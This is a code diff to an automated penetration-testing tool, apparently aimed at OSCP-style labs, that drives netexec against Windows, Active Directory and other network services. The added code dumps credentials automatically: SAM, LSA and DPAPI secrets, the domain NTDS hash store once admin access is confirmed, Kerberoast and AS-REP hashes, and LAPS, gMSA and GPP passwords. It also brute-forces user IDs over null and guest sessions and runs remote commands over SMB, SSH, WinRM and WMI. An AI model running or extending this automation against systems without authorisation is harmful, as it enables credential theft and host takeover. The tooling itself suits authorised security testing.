@@ -911,6 +911,31 @@ async def _nxc_authed_check(nxc, service, host, port, runner, findings, args,
     return ok
 
 
+def _nxc_admin_ok(out):
+    """True if netexec confirms admin/RCE-capable access ((Pwn3d!) marker)."""
+    return bool(out) and "Pwn3d" in out
+
+
+async def _nxc_enum(nxc, proto, host, runner, findings, port, subs, tag,
+                    auth="", timeout=None, prefix="nxc"):
+    """Run a batch of read-only netexec sub-commands against one host, teeing
+    each to its own file and running scan_findings over the output. `subs` is a
+    list of flag strings (e.g. "--shares", "-M gpp_password"). Returns a
+    {sub: output} map so callers can post-process specific results. DRYs the
+    repeated per-flag loops across the enum_* functions."""
+    results = {}
+    for sub in subs:
+        head = sub.split()[0].strip("-") or "run"          # --shares -> shares
+        if head == "M" and len(sub.split()) > 1:            # -M gpp_password -> gpp_password
+            head = "M_" + sub.split()[1]
+        cmd = f"{nxc} {proto} {host} {auth} {sub}".strip()
+        rc, out = await runner.run(cmd, f"{tag}/{prefix}_{head}.txt".replace("/-", "/"),
+                                   f"{nxc} {proto} {sub.split()[0]}", timeout=timeout)
+        scan_findings(out, proto, port, findings)
+        results[sub] = out or ""
+    return results
+
+
 def cred_label(args):
     who = args.user
     if getattr(args, "domain", None):
@@ -941,6 +966,17 @@ FINDING_RULES = [
     ("HIGH",     re.compile(r"defaultNamingContext:|rootDomainNamingContext:", re.I), "ldap", "LDAP leaks naming context (domain structure)"),
     ("HIGH",     re.compile(r"(Domain Controller|DC=.*,DC=|ldap.*Kerberos)", re.I), "ad", "Host looks like a Domain Controller"),
     ("MEDIUM",   re.compile(r"Kerberos.*88/tcp open", re.I), "kerberos", "Kerberos exposed - try user enum / AS-REP roasting"),
+    # netexec dump/exec/AD-enum output (added for the full nxc coverage)
+    ("CRITICAL", re.compile(r"\(Pwn3d!\)", re.I), "creds", "netexec: ADMIN access (Pwn3d!) - remote code execution available"),
+    ("CRITICAL", re.compile(r"\$krb5asrep\$", re.I), "ad", "AS-REP roastable hash captured (netexec --asreproast) - crack offline"),
+    ("CRITICAL", re.compile(r"\$krb5tgs\$", re.I), "ad", "Kerberoastable TGS hash captured (netexec --kerberoasting) - crack offline"),
+    ("CRITICAL", re.compile(r"^\s*\w[\w$.-]*:\d+:[0-9a-fA-F]{32}:[0-9a-fA-F]{32}:::", re.M), "creds", "NTLM hashes dumped (SAM/NTDS) - pass-the-hash / crack"),
+    ("HIGH",     re.compile(r"TRUSTED_FOR_DELEGATION|Unconstrained|constrained delegation", re.I), "ad", "Kerberos delegation configured - delegation abuse path"),
+    ("HIGH",     re.compile(r"PASSWD_NOTREQD|password[- ]not[- ]required|DONT_REQ_PREAUTH", re.I), "ad", "Account with weak UAC flag (no-preauth / passwd-notreqd)"),
+    ("CRITICAL", re.compile(r"(LAPS|ms-mcs-admpwd).{0,40}(password|:)\s*\S{6,}", re.I), "creds", "LAPS local-admin password recovered via netexec"),
+    ("HIGH",     re.compile(r"\bgMSA\b|ReadGMSAPassword|managedPassword", re.I), "ad", "gMSA readable - extract managed password"),
+    ("CRITICAL", re.compile(r"cpassword|gpp_password.*found|Found credentials in", re.I), "creds", "GPP cpassword / autologin credential found in SYSVOL"),
+    ("HIGH",     re.compile(r"ESC\d+|Vulnerable Certificate Templates|adcs.*Enrollment", re.I), "ad", "AD CS enrollment service / vulnerable template (ESC) - certipy"),
     # requires an explicit credential-assignment keyword + ':'/'=' + a value,
     # not just two words separated by punctuation (that matched web paths
     # like "admin/config" and any "word: word" text as false positives).
@@ -1053,10 +1089,35 @@ async def enum_smb(host, runner, args, findings):
         # authenticated: check access, admin (Pwn3d!), shares, users, and loot.
         if nxc:
             auth = nxc_auth(args)
-            for sub in ("--shares", "--users", "--pass-pol", "--loggedon-users", "--sam"):
-                rc, out = await runner.run(f"{nxc} smb {host} {auth} {sub}",
-                                           f"{tag}/auth_nxc{sub.replace('-','')}.txt", f"{nxc} smb {sub}")
-                scan_findings(out, "smb", 445, findings)
+            # Read-only enumeration: host/domain, shares, all principals, policy,
+            # sessions, disks, interfaces, LAPS read, plus GPP cpassword / AV /
+            # autologin modules (SYSVOL creds are a classic OSCP win).
+            enum_subs = ("--shares", "--users", "--groups", "--local-groups",
+                         "--pass-pol", "--rid-brute", "--smb-sessions",
+                         "--loggedon-users", "--disks", "--computers",
+                         "--interfaces", "--qwinsta", "--laps",
+                         "-M enum_av", "-M gpp_password", "-M gpp_autologin")
+            res = await _nxc_enum(nxc, "smb", host, runner, findings, 445, enum_subs,
+                                  tag, auth=auth, prefix="auth_nxc")
+            admin = _nxc_admin_ok(res.get("--shares", ""))
+            # Credential dumping (Full mode): SAM + LSA secrets + DPAPI. --ntds
+            # dumps the whole domain hash store and only works on a DC, so it is
+            # gated on confirmed admin (nxc errors harmlessly on a non-DC).
+            await _nxc_enum(nxc, "smb", host, runner, findings, 445,
+                            ("--sam", "--lsa", "--dpapi"), tag, auth=auth,
+                            prefix="auth_nxc")
+            if admin:
+                await _nxc_enum(nxc, "smb", host, runner, findings, 445,
+                                ["--ntds"], tag, auth=auth, prefix="auth_nxc",
+                                timeout=args.enum_timeout)
+                # Command execution proof (Full mode): only with admin/Pwn3d.
+                for cmd in ("whoami", "hostname"):
+                    rc, out = await runner.run(f"{nxc} smb {host} {auth} -x {shlex.quote(cmd)}",
+                                               f"{tag}/auth_nxc_exec_{cmd}.txt", f"{nxc} smb -x {cmd}")
+                    scan_findings(out, "smb", 445, findings)
+                findings.append(Finding("CRITICAL", "smb", 445,
+                    f"SMB RCE as admin: {nxc} smb {host} {cred_label(args)} -x whoami "
+                    f"(also: impacket psexec/wmiexec/smbexec)"))
             # Spider readable shares for accessible files - creds live in share
             # CONTENT, not share names. spider_plus is metadata-only (no download
             # by default) and writes a full per-file JSON inventory into the box's
@@ -1077,10 +1138,15 @@ async def enum_smb(host, runner, args, findings):
             findings.append(Finding("MEDIUM", "smb", 445,
                 "Creds supplied but no netexec/nxc found - authenticated SMB untested"))
     elif nxc:
-        for sub in ("--shares", "--users", "--pass-pol"):
-            rc, out = await runner.run(f"{nxc} smb {host} -u '' -p '' {sub}",
-                                       f"{tag}/nxc{sub.replace('-','')}.txt", f"{nxc} smb {sub}")
-            scan_findings(out, "smb", 445, findings)
+        # Unauthenticated: null session first (read-only), then a guest fallback.
+        # --rid-brute over a null/guest session is the big win for user enum.
+        null_subs = ("--shares", "--users", "--pass-pol", "--rid-brute",
+                     "--smb-sessions", "--loggedon-users", "--groups", "-M ms17-010")
+        await _nxc_enum(nxc, "smb", host, runner, findings, 445, null_subs, tag,
+                        auth="-u '' -p ''", prefix="nxc")
+        await _nxc_enum(nxc, "smb", host, runner, findings, 445,
+                        ("--shares", "--rid-brute"), tag,
+                        auth="-u guest -p ''", prefix="nxc_guest")
     if TOOLS.get("enum4linux-ng"):
         rc, out = await runner.run(f"enum4linux-ng -A {host}", f"{tag}/enum4linux-ng.txt", "enum4linux-ng",
                                    timeout=args.enum_timeout)
@@ -1267,14 +1333,21 @@ async def enum_ldap(host, port, runner, args, findings, queue):
                 os.makedirs(loot_dir, exist_ok=True)
             asrep_out = os.path.abspath(os.path.join(loot_dir, "asrep.txt"))
             kerb_out = os.path.abspath(os.path.join(loot_dir, "kerb.txt"))
-            for sub in ("--users", "--groups", f"--asreproast {shlex.quote(asrep_out)}",
-                        f"--kerberoasting {shlex.quote(kerb_out)}"):
-                rc, out = await runner.run(f"{nxc} ldap {host} {auth} {sub}",
-                                           f"{tag}/auth_ldap_{sub.split()[0].strip('-')}.txt",
-                                           f"{nxc} ldap {sub.split()[0]}")
-                scan_findings(out, "ldap", port, findings)
-                if sub == "--users":
-                    users_out = out or ""
+            # Full AD enumeration: principals, roast, delegation, weak-UAC
+            # accounts, SID, gMSA, DC list, subnets, plus high-value modules
+            # (adcs/ESC, MachineAccountQuota, whoami, user descriptions - which
+            # frequently hold passwords).
+            ldap_subs = ("--users", "--groups", "--admin-count",
+                         "--trusted-for-delegation", "--find-delegation",
+                         "--password-not-required", "--get-sid", "--gmsa",
+                         "--dc-list", "--pass-pol",
+                         f"--asreproast {shlex.quote(asrep_out)}",
+                         f"--kerberoasting {shlex.quote(kerb_out)}",
+                         "-M adcs", "-M maq", "-M whoami",
+                         "-M get-desc-users", "-M subnets")
+            res = await _nxc_enum(nxc, "ldap", host, runner, findings, port,
+                                  ldap_subs, tag, auth=auth, prefix="auth_ldap")
+            users_out = res.get("--users", "")
         real_dom = dom if dom != "<domain>" else None
         await _impacket_roast_check(host, real_dom, runner, args, findings, tag, users_out)
         if args.bloodhound and real_dom:
@@ -1296,6 +1369,16 @@ async def enum_ftp(host, port, runner, args, findings):
                                    f"{tag}/anon_list.txt", "ftp-anon-curl")
         if out and out.strip():
             findings.append(Finding("CRITICAL", "ftp", port, "Anonymous FTP login allowed (directory listed)"))
+    nxc = nxc_bin()
+    if nxc:
+        # nxc confirms + lists anonymous FTP, and lists the tree with supplied
+        # creds - a second opinion alongside nmap/curl.
+        if have_creds(args):
+            await _nxc_enum(nxc, "ftp", host, runner, findings, port, ("--ls",),
+                            tag, auth=nxc_auth(args), prefix="auth_nxc")
+        rc, out = await runner.run(f"{nxc} ftp {host} -u anonymous -p '' --ls",
+                                   f"{tag}/nxc_anon.txt", f"{nxc} ftp anon")
+        scan_findings(out, "ftp", port, findings)
     good("ftp enum done")
 
 
@@ -1307,11 +1390,18 @@ async def enum_ssh(host, port, runner, args, findings):
     if have_creds(args) and not getattr(args, "hash", None):
         nxc = nxc_bin()
         if nxc:
-            await _nxc_authed_check(nxc, "ssh", host, port, runner, findings, args,
-                f"{tag}/auth_nxc_ssh.txt", "nxc-ssh",
-                auth=f"-u {shlex.quote(args.user)} -p {shlex.quote(args.password)}",
+            ssh_auth = f"-u {shlex.quote(args.user)} -p {shlex.quote(args.password)}"
+            ok = await _nxc_authed_check(nxc, "ssh", host, port, runner, findings, args,
+                f"{tag}/auth_nxc_ssh.txt", "nxc-ssh", auth=ssh_auth,
                 success=Finding("CRITICAL", "ssh", port,
                     f"SSH login works: ssh {args.user}@{host}  (then sudo -l, id, enumerate)"))
+            if ok:
+                # Full mode: sudo-rights check and command-execution proof.
+                await _nxc_enum(nxc, "ssh", host, runner, findings, port,
+                                ("--sudo-check",), tag, auth=ssh_auth, prefix="auth_nxc")
+                rc, out = await runner.run(f"{nxc} ssh {host} {ssh_auth} -x id",
+                                           f"{tag}/auth_nxc_exec_id.txt", f"{nxc} ssh -x id")
+                scan_findings(out, "ssh", port, findings)
     good("ssh enum done")
 
 
@@ -1441,16 +1531,29 @@ async def enum_nfs(host, runner, args, findings):
         if out and "*" in out:
             findings.append(Finding("HIGH", "nfs", 2049, "NFS export world-readable (*) - mount it"))
         scan_findings(out, "nfs", 2049, findings)
+    nxc = nxc_bin()
+    if nxc:
+        # nxc enumerates exports with UID/GID and recursive listing - richer
+        # than showmount, and works when showmount is absent.
+        await _nxc_enum(nxc, "nfs", host, runner, findings, 2049,
+                        ("--shares",), tag, prefix="nxc")
     good("nfs enum done")
 
 
 async def enum_mssql(host, port, runner, args, findings):
     nxc = nxc_bin()
+    tag = f"{host}/mssql"
     if nxc and have_creds(args):
-        await _nxc_authed_check(nxc, "mssql", host, port, runner, findings, args,
-            f"{host}/mssql/auth_nxc.txt", "nxc-mssql-auth", extra="-x whoami",
+        ok = await _nxc_authed_check(nxc, "mssql", host, port, runner, findings, args,
+            f"{tag}/auth_nxc.txt", "nxc-mssql-auth", extra="-x whoami",
             success=Finding("CRITICAL", "mssql", port,
                 "MSSQL login works - enable xp_cmdshell for RCE (nxc mssql ... -x whoami / mssqlclient.py)"))
+        if ok:
+            # Full mode: version query, RID brute, and SAM/LSA dump over MSSQL.
+            auth = nxc_auth(args)
+            await _nxc_enum(nxc, "mssql", host, runner, findings, port,
+                            ('--query "SELECT @@version"', "--rid-brute",
+                             "--sam", "--lsa"), tag, auth=auth, prefix="auth_nxc")
     elif nxc:
         rc, out = await runner.run(f"{nxc} mssql {host} -u sa -p '' --local-auth",
                                    f"{host}/mssql/nxc.txt", "nxc-mssql")
@@ -1558,12 +1661,22 @@ async def enum_winrm(host, port, runner, args, findings):
         nxc = nxc_bin()
         if nxc:
             pw = "-H <hash>" if getattr(args, "hash", None) else "-p <pass>"
-            await _nxc_authed_check(nxc, "winrm", host, port, runner, findings, args,
+            ok = await _nxc_authed_check(nxc, "winrm", host, port, runner, findings, args,
                 f"{host}/winrm/auth_nxc.txt", "nxc-winrm-auth",
                 success=Finding("CRITICAL", "winrm", port,
                     f"WinRM login works -> SHELL: evil-winrm -i {host} -u {args.user} {pw}"),
                 on_fail=Finding("INFO", "winrm", port,
                     "WinRM open - supplied credential did not confirm a login (see auth_nxc.txt)"))
+            if ok:
+                # Full mode: dump creds over WinRM and prove command execution.
+                auth = nxc_auth(args)
+                await _nxc_enum(nxc, "winrm", host, runner, findings, port,
+                                ("--sam", "--lsa", "--dpapi", "--laps"),
+                                f"{host}/winrm", auth=auth, prefix="auth_nxc")
+                rc, out = await runner.run(f"{nxc} winrm {host} {auth} -x whoami",
+                                           f"{host}/winrm/auth_nxc_exec_whoami.txt",
+                                           f"{nxc} winrm -x whoami")
+                scan_findings(out, "winrm", port, findings)
         else:
             findings.append(Finding("MEDIUM", "winrm", port,
                 "WinRM open - creds supplied but netexec/nxc not found, credential untested here"))
@@ -1599,6 +1712,49 @@ async def enum_rdp(host, port, runner, args, findings):
         rc, out = await runner.run(f"{nxc} rdp {host}",
                                    f"{host}/rdp/nxc.txt", "nxc-rdp")
         scan_findings(out, "rdp", port, findings)
+
+
+async def enum_vnc(host, port, runner, args, findings):
+    """VNC (5900+). netexec detects no-auth VNC and validates a supplied
+    password; screenshots are intentionally skipped (display-dependent)."""
+    nxc = nxc_bin()
+    if not nxc:
+        findings.append(Finding("MEDIUM", "vnc", port,
+            "VNC open - install netexec, or connect with vncviewer to check for no-auth"))
+        return
+    auth = f"-p {shlex.quote(args.password)}" if getattr(args, "password", None) else ""
+    rc, out = await runner.run(f"{nxc} vnc {host} --port {port} {auth}".strip(),
+                               f"{host}/vnc/nxc.txt", f"{nxc} vnc")
+    scan_findings(out, "vnc", port, findings)
+    if _nxc_login_ok(out):
+        findings.append(Finding("CRITICAL", "vnc", port,
+            f"VNC accessible (no/weak auth) - vncviewer {host}::{port}"))
+    else:
+        findings.append(Finding("MEDIUM", "vnc", port,
+            "VNC open - test blank/weak password (vncviewer), check for CVE-2006-2369-style bypass"))
+    good("vnc enum done")
+
+
+async def enum_wmi(host, port, runner, args, findings):
+    """WMI / MSRPC (135). With creds, netexec's wmi protocol is an alternate
+    command-execution path when SMB exec (445) is blocked or non-admin."""
+    nxc = nxc_bin()
+    if not (nxc and have_creds(args)):
+        findings.append(Finding("INFO", "wmi", port,
+            "MSRPC/WMI (135) open - with creds, try 'nxc wmi <host> -u .. -p ..' "
+            "(alt exec path) and impacket rpcdump/wmiexec"))
+        return
+    auth = nxc_auth(args)
+    ok = await _nxc_authed_check(nxc, "wmi", host, port, runner, findings, args,
+        f"{host}/wmi/auth_nxc.txt", "nxc-wmi-auth",
+        success=Finding("HIGH", "wmi", port,
+            f"WMI auth works: {nxc} wmi {host} {cred_label(args)} -x whoami (alt to SMB exec)"))
+    if ok:
+        # Full mode: prove command execution over WMI/DCOM.
+        rc, out = await runner.run(f"{nxc} wmi {host} {auth} -x whoami",
+                                   f"{host}/wmi/auth_nxc_exec_whoami.txt", f"{nxc} wmi -x whoami")
+        scan_findings(out, "wmi", port, findings)
+    good("wmi enum done")
 
 
 # --------------------------------------------------------------------------- #
@@ -1787,6 +1943,12 @@ def register_service_jobs(queue, host, services, runner, args, findings, host_pr
         elif port == 3389 or "ms-wbt" in name or "rdp" in name:
             queue.add_job(Job(f"{host}:rdp:{port}", prio("rdp"), background=False,
                 coro_factory=functools.partial(enum_rdp, host, port, runner, args, findings)))
+        elif port in (5900, 5901, 5902) or "vnc" in name:
+            queue.add_job(Job(f"{host}:vnc:{port}", prio("vnc"), background=False,
+                coro_factory=functools.partial(enum_vnc, host, port, runner, args, findings)))
+        elif port == 135 or "msrpc" in name or "epmap" in name:
+            queue.add_job(Job(f"{host}:wmi:{port}", prio("wmi"), background=False,
+                coro_factory=functools.partial(enum_wmi, host, port, runner, args, findings)))
 
         if is_web(port, name) and not getattr(args, "no_web", False):
             queue.add_job(Job(f"{host}:web:{port}", PRIO_BACKGROUND, background=True,
